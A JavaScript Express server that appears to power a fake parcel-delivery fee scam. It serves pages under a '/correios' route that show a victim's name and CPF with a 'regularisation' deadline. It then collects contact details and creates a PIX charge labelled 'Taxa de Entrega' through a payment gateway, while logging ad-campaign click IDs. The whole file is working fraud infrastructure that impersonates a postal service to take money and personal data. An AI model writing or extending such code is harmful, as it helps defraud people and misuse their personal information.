import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

// ---- Buckpay (inline, no external imports to keep the build minimal) ----
const BUCKPAY_BASE = process.env.BUCKPAY_API_URL || 'https://api.realtechdev.com.br';

function buckpayHeaders() {
  const token = process.env.BUCKPAY_TOKEN || '';
  if (!token) throw Object.assign(new Error('BUCKPAY_TOKEN nao configurado'), { status: 500 });
  return {
    Authorization: `Bearer ${token}`,
    'User-Agent': process.env.BUCKPAY_USER_AGENT || 'Buckpay API',
    'Content-Type': 'application/json',
    Accept: 'application/json',
  };
}

function amountToCents(amount) {
  return Math.round(Number(amount) * 100);
}

function formatPhoneBr(phone) {
  let digits = String(phone || '').replace(/\D/g, '');
  if (!digits) return undefined;
  if (!digits.startsWith('55')) digits = `55${digits}`;
  if (digits.length >= 12 && digits.length <= 13) return digits;
  return undefined;
}

function sanitizeExternalId(raw) {
  const base = String(raw || '').replace(/[^a-zA-Z0-9_-]/g, '-').slice(0, 200);
  const suffix = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`;
  return `${base}-${suffix}`.slice(0, 255);
}

function qrCodeDataUri(base64) {
  if (!base64) return '';
  return base64.startsWith('data:') ? base64 : `data:image/png;base64,${base64}`;
}

function mapBuckpayStatus(status) {
  if (status === 'paid') return 'paid';
  if (status === 'cancelled' || status === 'canceled') return 'cancelled';
  if (status === 'failed' || status === 'refused' || status === 'expired') return 'failed';
  return 'pending';
}

async function createPixTransaction(payload) {
  const r = await fetch(`${BUCKPAY_BASE}/v1/transactions`, {
    method: 'POST',
    headers: buckpayHeaders(),
    body: JSON.stringify(payload),
    signal: AbortSignal.timeout(28000),
  });
  const body = await r.json().catch(() => ({}));
  if (!r.ok) {
    const msg = body?.error?.message || body?.message || `BuckPay HTTP ${r.status}`;
    throw Object.assign(new Error(msg), { status: r.status, body });
  }
  return body;
}

async function getTransactionById(id) {
  const safeId = String(id || '').trim();
  if (!safeId || !/^[a-zA-Z0-9-]+$/.test(safeId)) throw new Error('ID da transacao invalido');
  const r = await fetch(`${BUCKPAY_BASE}/v1/transactions/${encodeURIComponent(safeId)}`, {
    method: 'GET',
    headers: buckpayHeaders(),
    signal: AbortSignal.timeout(10000),
  });
  const body = await r.json().catch(() => ({}));
  if (!r.ok) {
    const msg = body?.error?.message || body?.message || `BuckPay HTTP ${r.status}`;
    throw Object.assign(new Error(msg), { status: r.status, body });
  }
  return body;
}

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const rootDir = __dirname;
const app = express();

const config = {
  amount: Number(process.env.AMOUNT || 58.36),
  product_key: process.env.PRODUCT_KEY || 'main',
  city: process.env.CITY || 'Curitiba',
  state: process.env.STATE || 'PR',
  cpf_lookup_nonce: process.env.CPF_LOOKUP_NONCE || 'bde6818eeddc0201f9b6d80e17acb948',
  customer_flow_nonce: process.env.CUSTOMER_FLOW_NONCE || 'e8581726cd6c71ddf21852cfe43c867d',
  checkout_cpf_nonce: process.env.CHECKOUT_CPF_NONCE || '92e3e85ff8d687d36f46624b1bfc10b6',
  cpf_database: {
    '52998224725': 'João Silva',
    '11144477735': 'Maria Souza',
    '39053344705': 'Carlos Mendes',
  },
};

function stripTopPhp(src) {
  const m = src.match(/^<\?php[\s\S]*?\?>\s*/);
  return m ? src.slice(m[0].length) : src;
}

// Load templates once at startup — fails fast if files are missing
const indexHtml = stripTopPhp(fs.readFileSync(path.join(rootDir, 'index.php'), 'utf8'));
const objetoHtml = stripTopPhp(fs.readFileSync(path.join(rootDir, 'objeto.php'), 'utf8'));
const checkoutHtml = stripTopPhp(fs.readFileSync(path.join(rootDir, 'checkout.php'), 'utf8'));

const sessions = new Map();

function normalizeCpf(cpf) {
  return String(cpf || '').replace(/\D/g, '').slice(0, 11);
}

function isValidCpf(cpf) {
  const digits = normalizeCpf(cpf);
  if (digits.length !== 11 || /^(\d)\1{10}$/.test(digits)) return false;
  for (let t = 9; t < 11; t++) {
    let sum = 0;
    for (let i = 0; i < t; i++) sum += Number(digits[i]) * (t + 1 - i);
    const check = ((10 * sum) % 11) % 10;
    if (Number(digits[t]) !== check) return false;
  }
  return true;
}

function formatCpf(cpf) {
  return normalizeCpf(cpf).replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, '$1.$2.$3-$4');
}

function escapeHtml(v) {
  return String(v).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function getSessionId(req) {
  const m = (req.headers.cookie || '').match(/sid=([^;]+)/);
  if (m) return m[1];
  const sid = `sess_${Date.now().toString(36)}`;
  req.generatedSid = sid;
  return sid;
}

function getSession(req) {
  const sid = getSessionId(req);
  if (!sessions.has(sid)) sessions.set(sid, { customer: {}, tracking: {} });
  return { sid, data: sessions.get(sid) };
}

app.use(express.json());
app.use((req, res, next) => {
  const { sid, data } = getSession(req);
  if (req.generatedSid) res.setHeader('Set-Cookie', `sid=${req.generatedSid}; Path=/; HttpOnly; SameSite=Lax`);
  req.session = data;
  req.sid = sid;
  next();
});

// ---- CPF lookup ----
function cpfLookup(req, res) {
  const cpf = normalizeCpf(req.query.cpf);
  const nonce = String(req.query.nonce || '');
  if (![config.cpf_lookup_nonce, config.checkout_cpf_nonce].includes(nonce))
    return res.status(403).json({ found: false, error: 'Nonce invalido' });
  if (!isValidCpf(cpf)) return res.json({ found: false, error: 'CPF invalido' });
  const name = config.cpf_database[cpf];
  return name
    ? res.json({ found: true, data: { NOME: name } })
    : res.json({ found: false, error: 'Nao foi possivel consultar este CPF agora' });
}
app.get('/api.php', cpfLookup);
app.get('/api/api', cpfLookup);

// ---- Save customer ----
function saveCustomer(req, res) {
  if (req.body?.nonce !== config.customer_flow_nonce)
    return res.status(403).json({ success: false, error: 'Nonce invalido' });
  const cpf = normalizeCpf(req.body?.cpf);
  const nome = String(req.body?.nome || '').trim();
  if (!isValidCpf(cpf) || nome.length < 3)
    return res.status(422).json({ success: false, error: 'Payload invalido' });
  req.session.customer = {
    cpf, nome, name: nome,
    email: req.body?.email || '',
    telefone: String(req.body?.telefone || '').replace(/\D/g, ''),
  };
  res.json({ success: true });
}
app.post('/save_customer.php', saveCustomer);
app.post('/api/save-customer', saveCustomer);

// ---- Create PIX charge (Buckpay) ----
async function createPix(req, res) {
  const name = String(req.body?.name || '').trim();
  const document = normalizeCpf(req.body?.document);
  const email = String(req.body?.email || '').trim();
  const telephone = String(req.body?.telephone || '').replace(/\D/g, '');

  if (!isValidCpf(document) || name.length < 3 || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || telephone.length < 10)
    return res.status(422).json({ success: false, error: 'Payload invalido' });

  const amountCents = amountToCents(config.amount);
  if (amountCents < 600 || amountCents > 300000)
    return res.status(422).json({ success: false, error: 'Valor invalido para a Buckpay' });

  const externalId = sanitizeExternalId(req.body?.idempotency_key || `upsell-${document}`);
  const phone = formatPhoneBr(telephone);
  const tracking = req.body?.tracking && typeof req.body.tracking === 'object' ? req.body.tracking : {};

  const buckpayPayload = {
    external_id: externalId,
    payment_method: 'pix',
    amount: amountCents,
    buyer: { name, email, document, ...(phone ? { phone } : {}) },
    product: { id: String(req.body?.product_key || config.product_key), name: 'Taxa de Entrega' },
    offer: { id: `${req.body?.product_key || config.product_key}-offer`, name: 'Taxa de Entrega', quantity: 1 },
    tracking: {
      utm_id: tracking.utm_id || externalId,
      utm_source: tracking.utm_source || null,
      utm_medium: tracking.utm_medium || null,
      utm_campaign: tracking.utm_campaign || null,
      utm_content: tracking.utm_content || null,
      utm_term: tracking.utm_term || null,
      src: tracking.src || null,
      ref: tracking.campaign || tracking.ref || null,
      sck: tracking.click_id || tracking.sck || null,
    },
  };

  try {
    const result = await createPixTransaction(buckpayPayload);
    const data = result.data || result;
    const pix = data.pix || {};
    return res.json({
      success: true,
      data: {
        id: data.id,
        external_id: externalId,
        status_nonce: data.id,
        brCode: pix.code || '',
        pix: { qr_code: { data_uri: qrCodeDataUri(pix.qrcode_base64 || '') } },
      },
    });
  } catch (error) {
    const status = error.status && error.status < 500 ? error.status : 502;
    return res.status(status).json({
      success: false,
      error: error.message || 'Erro ao gerar PIX na Buckpay',
      details: error.body || null,
    });
  }
}
app.post('/api_pix_proxy.php', createPix);
app.post('/api/pix', createPix);

// ---- Payment status (Buckpay) ----
async function paymentStatus(req, res) {
  const reference = String(req.query.reference || '').trim();
  if (!reference) return res.status(422).json({ success: false, error: 'Referencia invalida' });
  try {
    const result = await getTransactionById(reference);
    const data = result.data || result;
    const paid = mapBuckpayStatus(data.status) === 'paid';
    return res.json({
      success: true,
      data: { paid, status: data.status || 'pending', thankYouUrl: 'checkout.php?paid=1' },
    });
  } catch (error) {
    const status = error.status === 404 ? 404 : error.status && error.status < 500 ? error.status : 502;
    return res.status(status).json({ success: false, error: error.message || 'Nao foi possivel consultar o pagamento' });
  }
}
app.get('/api_payment_status_proxy.php', paymentStatus);
app.get('/api/payment-status', paymentStatus);

app.get('/objeto.php', (req, res) => {
  const cpf = normalizeCpf(req.query.cpf || req.session.customer?.cpf || '');
  const nome = String(req.query.nome || req.session.customer?.nome || req.session.customer?.name || 'Cliente').trim();
  if (cpf && nome) req.session.customer = { ...req.session.customer, cpf, nome, name: nome };

  const cpfFormatado = cpf ? formatCpf(cpf) : '000.000.000-00';
  const nomeExibicao = nome || 'Cliente';
  const primeiroNome = nomeExibicao.split(' ')[0];
  const hoje = new Date();
  const prazoRegularizacao = hoje.toLocaleDateString('pt-BR');
  const entrega = new Date(hoje);
  entrega.setDate(entrega.getDate() + 6);
  const prazoEntrega = entrega.toLocaleDateString('pt-BR');
  const tracking = req.session.tracking || {};
  const trackingQuery = new URLSearchParams(tracking).toString();
  const checkoutSuffix = trackingQuery ? `?${trackingQuery}` : '';

  const html = objetoHtml
    .replace(/<\?php echo htmlspecialchars\(\$nomeExibicao, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(nomeExibicao))
    .replace(/<\?php echo htmlspecialchars\(\$cpfFormatado, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(cpfFormatado))
    .replace(/<\?php echo htmlspecialchars\(\$primeiroNome, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(primeiroNome))
    .replace(/<\?php echo htmlspecialchars\(\$cidade, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(config.city))
    .replace(/<\?php echo htmlspecialchars\(\$estado, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(config.state))
    .replace(/<\?php echo \$prazoEntrega; \?>/g, prazoEntrega)
    .replace(/<\?php echo \$prazoRegularizacao; \?>/g, prazoRegularizacao)
    .replace(/<\?php echo htmlspecialchars\(\$checkoutSuffix, ENT_QUOTES, 'UTF-8'\); \?>/g, checkoutSuffix);

  res.type('html').send(html);
});

app.get('/checkout.php', (req, res) => {
  const customer = req.session.customer || {};
  const amountFormatted = config.amount.toFixed(2).replace('.', ',');
  const tracking = req.session.tracking || {};
  const checkoutConfigScript = `<script>\n    window.CHECKOUT_CONFIG = ${JSON.stringify({
    initialCustomerName: customer.nome || customer.name || '',
    initialCustomerDocument: customer.cpf || '',
    customerEmail: customer.email || '',
    customerTelephone: customer.telefone || '',
    trackingData: tracking,
    productKey: config.product_key,
    cpfLookupNonce: config.checkout_cpf_nonce,
    amount: config.amount,
    clientScope: 'local',
  })};\n    </script>`;

  const html = checkoutHtml
    .replace(/<script>\s*window\.CHECKOUT_CONFIG[\s\S]*?<\/script>\s*/i, `${checkoutConfigScript}\n    `)
    .replace(/<\?php echo \$amountFormatted; \?>/g, amountFormatted);

  res.type('html').send(html);
});

app.get(['/', '/correios', '/index.php'], (req, res) => {
  const trackingKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'campaign', 'fbclid', 'gclid', 'click_id'];
  trackingKeys.forEach((key) => {
    if (req.query[key]) req.session.tracking[key] = String(req.query[key]);
  });

  const trackingQuery = new URLSearchParams(req.session.tracking).toString();
  const appConfigScript = `<script>window.APP_CONFIG = ${JSON.stringify({
    cpfLookupNonce: config.cpf_lookup_nonce,
    customerFlowNonce: config.customer_flow_nonce,
    trackingUrl: trackingQuery,
  })};</script>`;

  const html = indexHtml.replace(/<script>\s*window\.APP_CONFIG[\s\S]*?<\/script>\s*/i, `${appConfigScript}\n  `);
  res.type('html').send(html);
});

app.use(express.static(path.join(rootDir, 'public'), { index: false }));

const PORT = process.env.PORT;
if (PORT) {
  app.listen(PORT, () => console.log(`Servidor em http://localhost:${PORT}`));
}

export default app;
